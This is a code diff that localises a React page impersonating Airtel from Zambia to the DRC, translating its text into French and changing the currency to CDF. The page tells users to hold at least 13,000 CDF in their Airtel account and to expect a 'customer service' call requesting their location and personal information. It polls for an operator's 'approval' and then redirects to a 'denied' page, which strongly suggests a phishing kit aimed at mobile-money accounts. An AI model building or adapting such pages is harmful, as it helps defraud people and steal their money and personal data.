@@ -33,7 +33,7 @@ function AirtelLoanLimit() {
   const handleContinue = async () => {
     setIsProcessing(true);
     setErrorMessage('');
-    setStatusMessage('Sending request...');
+    setStatusMessage('Envoi de la demande...');
 
     const phone = localStorage.getItem('airtelPhone') || '';
     if (!phone) {
@@ -50,11 +50,11 @@ function AirtelLoanLimit() {
       const data = await res.json();
 
       if (data.status !== 'pending' || !data.approval_id) {
-        setErrorMessage('Error sending request.');
+        setErrorMessage('Erreur lors de l\'envoi de la demande.');
         return;
       }
 
-      setStatusMessage('Waiting for approval...');
+      setStatusMessage('En attente de l\'approbation...');
       const approvalId = data.approval_id;
 
       let attempts = 0;
@@ -65,7 +65,7 @@ function AirtelLoanLimit() {
 
         if (attempts > maxAttempts) {
           stopPolling();
-          setErrorMessage('Request timed out. Please try again.');
+          setErrorMessage('Délai dépassé. Veuillez réessayer.');
           return;
         }
 
@@ -77,7 +77,7 @@ function AirtelLoanLimit() {
 
           if (statusData.status === 'approved') {
             stopPolling();
-            setStatusMessage('Approved! Redirecting...');
+            setStatusMessage('Approuvé ! Redirection...');
             setTimeout(() => navigate('/airtel-denied'), 600);
           } else if (statusData.status === 'rejected') {
             stopPolling();
@@ -88,14 +88,14 @@ function AirtelLoanLimit() {
             navigate('/');
           } else if (statusData.status === 'expired') {
             stopPolling();
-            setErrorMessage('Session expired. Please try again.');
+            setErrorMessage('Session expirée. Veuillez réessayer.');
           }
         } catch {
           // Network hiccup — keep polling
         }
       }, 2000);
     } catch {
-      setErrorMessage('Server connection error.');
+      setErrorMessage('Erreur de connexion au serveur.');
     }
   };
 
@@ -110,8 +110,8 @@ function AirtelLoanLimit() {
             <line x1="3" y1="18" x2="21" y2="18"></line>
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel ZMW</h1>
-        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
+        <h1 className="airtel-logo">Airtel DRC</h1>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
 
       {/* Main White Card */}
@@ -124,40 +124,43 @@ function AirtelLoanLimit() {
           Back
         </button>
 
-        <h2 className="airtel-limit-heading">Your Loan Limit</h2>
+        <h2 className="airtel-limit-heading">Votre appareil de prêt</h2>
         <p className="airtel-limit-subtext">
-          Here is the amount you can borrow
+          Voici les étapes à suivre pour obtenir votre appareil :
         </p>
 
-        {/* Highlighted Loan Amount Box */}
-        <div className="airtel-limit-box">
-          <span className="airtel-limit-label">Available Loan Amount</span>
-          <span className="airtel-limit-amount">10,000</span>
-          <span className="airtel-limit-currency">ZMW</span>
-        </div>
-
-        {/* Loan Details List */}
-        <div className="airtel-details-list">
-          <div className="airtel-detail-row">
-            <span>Loan Term</span>
-            <span>6 months</span>
-          </div>
-          <div className="airtel-detail-row">
-            <span>Interest Rate</span>
-            <span>13%</span>
-          </div>
-          <div className="airtel-detail-row">
-            <span>Processing Fee</span>
-            <span>Free</span>
-          </div>
+        <div className="airtel-steps">
+          <p className="airtel-step">
+            1. Avant de cliquer sur « Demander », assurez-vous que votre compte
+            Airtel dispose d'au moins 13 000 CDF. Dans le cas contraire, veuillez
+            effectuer un dépôt.
+          </p>
+          <p className="airtel-step">
+            2. Cliquez sur « Demander » si votre compte dispose d'au moins
+            13 000 CDF.
+          </p>
+          <p className="airtel-step airtel-step-note">
+            **Remarque : Aucun montant ne sera prélevé avant la réception de
+            votre appareil.
+          </p>
+          <p className="airtel-step">
+            3. Vous recevrez un appel du service client d'Airtel. Il vous sera
+            demandé de fournir votre localisation ainsi que vos informations
+            personnelles.
+          </p>
+          <p className="airtel-step">
+            4. L'appareil vous sera livré, ou vous pourrez le récupérer dans
+            notre magasin.
+          </p>
         </div>
 
         <button
           className="airtel-continue-btn"
           onClick={handleContinue}
           disabled={isProcessing}
+          style={isProcessing ? { backgroundColor: '#9CA3AF', cursor: 'wait' } : undefined}
         >
-          {isProcessing ? 'Processing...' : 'Continue to Get Loan'}
+          {isProcessing ? 'Traitement en cours...' : 'Continuer pour obtenir le prêt'}
           {!isProcessing && (
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <line x1="5" y1="12" x2="19" y2="12"></line>
@@ -180,18 +183,18 @@ function AirtelLoanLimit() {
                     <line x1="12" y1="16" x2="12.01" y2="16"></line>
                   </svg>
                 </div>
-                <h3 className="airtel-modal-title">An error occurred</h3>
+                <h3 className="airtel-modal-title">Une erreur est survenue</h3>
                 <p className="airtel-modal-subtext">{errorMessage}</p>
                 <button className="airtel-modal-close-btn" onClick={closeModal}>
-                  Close
+                  Fermer
                 </button>
               </>
             ) : (
               <>
                 <div className="airtel-modal-spinner" />
-                <h3 className="airtel-modal-title">Processing...</h3>
+                <h3 className="airtel-modal-title">Traitement en cours...</h3>
                 <p className="airtel-modal-subtext">
-                  {statusMessage || 'Please wait...'}
+                  {statusMessage || 'Veuillez patienter...'}
                 </p>
               </>
             )}
